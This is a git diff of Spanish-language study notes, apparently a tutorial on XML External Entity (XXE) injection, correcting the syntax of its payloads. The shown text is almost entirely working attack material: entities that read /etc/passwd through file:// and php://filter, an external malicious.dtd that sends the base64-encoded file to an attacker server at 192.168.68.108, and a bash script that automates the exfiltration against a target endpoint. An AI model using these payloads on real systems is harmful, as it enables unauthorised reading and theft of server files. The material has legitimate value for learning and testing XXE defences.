@@ -41,7 +41,7 @@ También podemos explotar
 En el archivo XML debemos de colocar un DOCTYPE y ese es el que estaremos modificando
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-	<DOCTYPE foo [<! ENTITY myName "omar">]>                                                        <!-- Colocamos lo que queremos que salga en el output de la web -->
+	<!DOCTYPE foo [<!ENTITY myName "omar">]>                                                        <!-- Colocamos lo que queremos que salga en el output de la web -->
 	<root>
 		<name>
 			<email>
@@ -53,7 +53,7 @@ En el archivo XML debemos de colocar un DOCTYPE y ese es el que estaremos modifi
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-	<DOCTYPE foo [<! ENTITY myFile SYSTEM "file:///etc/passwd">]>                                    <!-- Colocamos la ruta abosluta del archivo -->
+	<!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///etc/passwd">]>                                    <!-- Colocamos la ruta abosluta del archivo -->
 	<root>
 		<name>
 			<email>
@@ -65,7 +65,7 @@ En el archivo XML debemos de colocar un DOCTYPE y ese es el que estaremos modifi
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-	<DOCTYPE foo [<! ENTITY myFile SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>    <!-- Representara el output en una sola linea en base64 -->
+	<!DOCTYPE foo [<!ENTITY myFile SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>    <!-- Representara el output en una sola linea en base64 -->
 	<root>
 		<name>
 			<email>
@@ -77,7 +77,7 @@ En el archivo XML debemos de colocar un DOCTYPE y ese es el que estaremos modifi
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-	<DOCTYPE foo [<! ENTITY myFile SYSTEM "http://192.168.68.108/testXXE">]>            <!-- Hara una peticion GET a nuestro servidor buscando el archivo testXXE -->
+	<!DOCTYPE foo [<!ENTITY myFile SYSTEM "http://192.168.68.108/testXXE">]>            <!-- Hara una peticion GET a nuestro servidor buscando el archivo testXXE -->
 	<root>
 		<name>
 			<email>
@@ -121,7 +121,7 @@ En el archivo XML debemos de colocar un DOCTYPE y ese es el que estaremos modifi
 Cuando no se puede llamar la entidad desde el campo seleccionado en la estructura, lo llamamos desde el DOCTYPE colocando el porcentaje al inicio y final con el nombre. El archivo debe de tener la extensión **.dtd**
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-	<DOCTYPE foo [<! ENTITY % xxe SYSTEM "http://192.168.68.108/malicious.dtd"> %xxe;]>       <!-- Hara una peticion GET a nuestro servidor buscando el archivo testXXE -->
+	<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.68.108/malicious.dtd"> %xxe;]>       <!-- Hara una peticion GET a nuestro servidor buscando el archivo testXXE -->
 	<root>
 		<name>
 			<email>
@@ -138,8 +138,8 @@ Cuando no se puede llamar la entidad desde el campo seleccionado en la estructur
 
 * Haremos que el output en base64 me lo envié a mi maquina de atacante como una petición por GET. Esto dentro del archivo  malicious.dtd
 ```xml
-<! ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
-<! ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.68.108/?file=%file;' >">                  <!-- Debemos de colocar el % en HEX = 25 --> 
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.68.108/?file=%file;' >">                  <!-- Debemos de colocar el % en HEX = 25 --> 
 %eval;                                                                                                   <!-- Debemos de llamar a las entidades --> 
 %exfil; 
 ```
@@ -160,8 +160,8 @@ Con este automatizas el proceso y puedes solicitar el archivo que quieras.
 echo -ne "[+] Introdiuce el archivo a leer: " && read -r myFilename
 
 maliciuos_dtd="""
-<! ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=$myFilename">
-<! ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.68.108/?file=%file;'>">                  
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=$myFilename">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.68.108/?file=%file;'>">                  
 %eval;                                                                                                    
 %exfil; """
 
@@ -174,7 +174,7 @@ PID=$!
 sleep 1; echo
 
 curl -s -X POST "http://localhost:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?>
-<DOCTYPE foo [<! ENTITY % xxe SYSTEM "http://192.168.68.108/malicious.dtd"> %xxe;]>      
+<!DOCTYPE foo [<! ENTITY % xxe SYSTEM "http://192.168.68.108/malicious.dtd"> %xxe;]>      
 <root><name><email>test@test.com</email></name></root>' &>/dev/null
 
 cat response  | grep -oP "/?file=\K[^.*]+" | base64 -d
